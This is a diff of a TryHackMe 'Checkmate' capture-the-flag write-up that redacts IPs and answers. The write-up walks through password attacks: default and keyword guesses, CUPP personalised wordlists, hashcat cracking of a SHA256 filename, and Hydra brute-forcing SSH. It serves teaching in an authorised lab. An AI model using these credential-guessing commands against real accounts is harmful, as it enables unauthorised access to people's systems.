@@ -3,11 +3,22 @@
 
 **Pathway:** *Jr Penetration Tester* | **Section:** *Password Attacks* | **Challenge:** *[Checkmate](https://tryhackme.com/room/checkmate)*
 
-> **Spoiler warning:** This write-up contains the full exploitation chain, however no flag codes are shown in this write-up!
+> [!IMPORTANT]
+> **Spoiler warning:** This writeup contains part of exploitation chain, however no flag codes are shown in this writeup!
 >
-> **Please note:** The IP addresses shown in this write-up were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe Paris VPN server.
+> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
 >
-> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit).
+> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
+> 
+> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
+>
+> - `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
+> - `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
+> - `<REDACTED>` - information intentionally removed from the public writeup, such as flags, credentials, hashes or other challenge-sensitive values.
+>
+> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.
+
+---
 
 ## About TryHackMe
 
@@ -23,8 +34,8 @@ The challenge demonstrated how default credentials, common organisational keywor
 
 Confirmed lab details used during the assessment:
 
-    Target IP: 10.130.133.183
-    Kali tun0 IP: 192.168.129.186
+    Target IP: <TARGET_IP>
+    Kali tun0 IP: <TUN0_IP>
     Attacker working directory: /tmp/VK
 
 Marco Bianchi, a systems administrator, recently deployed several internal services, including a firewall console, employee portal, social platform, and SSH access to critical infrastructure. Due to tight deadlines and operational pressure, Marco reused weak, predictable, and pattern-based passwords across multiple systems.  
@@ -52,7 +63,7 @@ The challenge used several virtual hostnames. These were added to `/etc/hosts` b
 
 The following entry was added:
 
-    10.130.133.183 firewall.thm jobs.thm social.thm
+    <TARGET_IP> firewall.thm jobs.thm social.thm
 
 This allowed the services to be accessed by their intended names:
 
@@ -66,7 +77,7 @@ Correct hostname resolution was important because each application was designed 
 
 The main challenge application was accessed on port 5000.
 
-    curl -i http://10.130.133.183:5000/
+    curl -i http://<TARGET_IP>:5000/
 
 The application presented five password-related levels:
 
@@ -112,7 +123,7 @@ The password was then submitted to the main challenge application:
     curl -s -c checkmate.cookies -b checkmate.cookies \
       -H 'Content-Type: application/json' \
       -d '{"level":1,"password":"<REDACTED>"}' \
-      http://10.130.133.183:5000/check
+      http://<TARGET_IP>:5000/check
 
 ## Level 2 - Common Company Keyword
 
@@ -168,7 +179,7 @@ The password was submitted to the challenge application:
     curl -s -c checkmate.cookies -b checkmate.cookies \
       -H 'Content-Type: application/json' \
       -d '{"level":2,"password":"<REDACTED>"}' \
-      http://10.130.133.183:5000/check
+      http://<TARGET_IP>:5000/check
 
 ## Level 3 - Personalised Password Attack
 
@@ -189,9 +200,9 @@ The employee portal was accessed using the Level 2 credentials:
 Marco's employee profile exposed the following information:
 
     First name: Marco
-    Surname: Bianchi
-    Nickname: marky
-    Birthdate: 14021995
+    Surname: <REDACTED>
+    Nickname: <REDACTED>
+    Birthdate: <REDACTED>
 
 CUPP was launched in interactive mode:
 
@@ -200,9 +211,9 @@ CUPP was launched in interactive mode:
 The known personal details were entered when prompted:
 
     First Name: Marco
-    Surname: Bianchi
-    Nickname: marky
-    Birthdate: 14021995
+    Surname: <REDACTED>
+    Nickname: <REDACTED>
+    Birthdate: <REDACTED>
 
 Fields for which no reliable information was available were left blank. CUPP generated the following wordlist:
 
@@ -226,7 +237,7 @@ The password was submitted to the challenge application:
     curl -s -c checkmate.cookies -b checkmate.cookies \
       -H 'Content-Type: application/json' \
       -d '{"level":3,"password":"<REDACTED>"}' \
-      http://10.130.133.183:5000/check
+      http://<TARGET_IP>:5000/check
 
 ## Level 4 - Recovering the Original Profile Picture Filename
 
@@ -242,11 +253,11 @@ Marco's social account was accessed using the Level 3 credentials:
 
 The authenticated page contained the profile picture path:
 
-    /uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
+    /uploads/<REDACTED>.png
 
 The SHA256 hash was therefore:
 
-    d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b
+    <REDACTED>
 
 An initial targeted filename list was created:
 
@@ -267,13 +278,13 @@ Each filename was hashed and compared against the stored value:
 
     while read -r name; do
       printf '%s' "$name" | sha256sum |
-      grep -q '^d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b' &&
+      grep -q '^<REDACTED>' &&
       echo "MATCH: $name"
     done < filenames.txt
 
 No candidate matched, so the raw hash was saved for offline cracking:
 
-    echo 'd34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b' \
+    echo '<REDACTED>' \
       > marcopic.txt
 
 Hashcat mode `1400` was used because the value was a raw SHA256 hash:
@@ -282,8 +293,8 @@ Hashcat mode `1400` was used because the value was a raw SHA256 hash:
 
 Hashcat recovered the original filename:
 
-    d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b:<REDACTED>
-
+    <REDACTED>:<REDACTED>
+                   
 Level 4 answer:
 
     <REDACTED>
@@ -293,11 +304,11 @@ Only the original filename was submitted, without the `.png` extension:
     curl -s -c checkmate.cookies -b checkmate.cookies \
       -H 'Content-Type: application/json' \
       -d '{"level":4,"password":"<REDACTED>"}' \
-      http://10.130.133.183:5000/check
+      http://<TARGET_IP>:5000/check
 
 ## Level 5 - Predictable SSH Password Pattern
 
-Marco's social profile contained a post that revealed his password construction method.
+Marco's social profile contained a post that rev                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ealed his password construction method.
 
 The pattern was:
 
@@ -336,11 +347,11 @@ Its entries followed this structure:
 
 Hydra was used to test the targeted candidates against SSH:
 
-    hydra -l marco -P level5.txt ssh://10.130.133.183
+    hydra -l marco -P level5.txt ssh://<TARGET_IP>
 
 Hydra identified a valid SSH password:
 
-    [22][ssh] host: 10.130.133.183 login: marco password: <REDACTED>
+    [22][ssh] host: <TARGET_IP> login: marco password: <REDACTED>
 
 Level 5 password:
 
@@ -351,7 +362,7 @@ The final password was submitted to the challenge application:
     curl -s -c checkmate.cookies -b checkmate.cookies \
       -H 'Content-Type: application/json' \
       -d '{"level":5,"password":"<REDACTED>"}' \
-      http://10.130.133.183:5000/check
+      http://<TARGET_IP>:5000/check
 
 The application confirmed successful completion:
 
@@ -414,14 +425,16 @@ The weaknesses demonstrated in this challenge could be mitigated by:
 
 ## Disclaimer
 
-This write-up is intended solely for education, training and documentation of an authorised TryHackMe lab.
+This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.
 
 All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.
 
 The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.
 
+Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.
+
 ---
 [!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  
 
-**Powered on ☕ made with ❤️ by [Valikahn](https://github.com/Valikahn)**  
+**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
 ⭐ If this project is useful, consider starring it on GitHub.
